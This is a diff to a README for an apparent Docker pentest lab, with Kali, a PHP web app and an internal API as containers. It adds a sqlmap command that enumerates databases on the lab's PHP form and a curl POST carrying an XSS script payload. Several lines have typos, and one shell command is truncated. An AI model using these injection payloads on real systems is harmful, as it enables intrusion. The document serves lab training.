@@ -1,28 +1,48 @@
-## Run docker compose
+### Run docker compose
 ```
 docker-compose up --build
 ```
-## Open an interactive bash shell inside the `kali_pentest` container
+## Open  shell in `kali_pentest` container
 ```
-docker exec -it kali_pentest /bin/bash
-```
-
-## Update the package lists for upgrades and new package installations
-```bash
-apt-get update
+docker exec -it kali_pentest /bin/
 ```
 
-## Install the `iputils-ping` package, which provides the `ping` command
-```bash
+## Install ping command
+```
 apt-get install -y iputils-ping
 ```
 
-## Use the `ping` command to check the connectivity to `php_web`
-```bash
+## Use ping command to check connectivity to `php_web`
+```
 ping php_web
 ```
 
-## Use the `ping` command to check the connectivity to `internal_api`
-```bash
+## Use pingcommand to check connectivity to `internal_api`
+```
 ping interal_api
 ```
+
+## Insall sqlmap for SQL Injection
+```
+apt-get install -y sqlmap
+```
+example:
+```
+sqlmap -u "http://php_web/index.php" --data="nom=Brie&prix=4.50" --dbs
+```
+
+## Install curl command for XSS
+```
+apt-get install -y curl
+```
+example:
+```
+curl -X POST -d "nom=<script>alert('XSS Test')</script>&prix=4.50" http://php_web/index.php
+```
+
+## Monitor the logs:
+```
+docker logs internal_api
+docker logs php_web
+```
+
